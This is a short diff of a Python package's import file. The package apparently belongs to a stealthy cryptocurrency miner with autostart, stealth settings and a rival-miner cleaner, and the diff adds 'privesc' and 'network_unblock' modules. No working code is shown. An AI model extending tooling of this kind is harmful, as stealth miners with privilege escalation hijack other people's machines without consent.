@@ -4,3 +4,5 @@ from .autostart import AutoStart
 from .dashboard import DashboardServer
 from .stealth import StealthConfig
 from .cleaner import MinerCleaner
+from . import privesc
+from . import network_unblock
